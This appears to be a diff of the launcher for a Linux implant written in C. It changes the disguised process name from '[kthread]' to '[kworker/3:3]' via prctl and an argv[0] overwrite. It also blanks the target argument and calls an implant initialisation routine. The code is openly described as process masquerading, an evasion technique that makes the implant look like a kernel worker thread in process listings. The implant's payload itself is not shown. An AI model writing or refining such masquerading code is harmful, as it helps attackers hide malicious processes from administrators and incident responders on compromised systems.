@@ -4,6 +4,7 @@
 #include <string.h>
 #include <sys/prctl.h>
 #include <sys/ioctl.h>
+#include <sys/mman.h>
 #include "../include/implant.h"
 
 int main(int argc, char **argv) {
@@ -24,8 +25,8 @@ int main(int argc, char **argv) {
     strncpy(target, argv[1], strlen(argv[1]) + 1);
 
     // process masquerading, change the command name associated with the proces (/proc/<pid>/comm)
-    prctl(PR_SET_NAME, "[kthread]", NULL, NULL, NULL);
-    strncpy(argv[0], "[kthread]", strlen(argv[0]) + 1);
+    prctl(PR_SET_NAME, "[kworker/3:3]", NULL, NULL, NULL);
+    strncpy(argv[0], "[kworker/3:3]", strlen(argv[0]) + 1);
     strncpy(argv[1], "\0", strlen(argv[1]));
 
     implant_init_n_call(target);
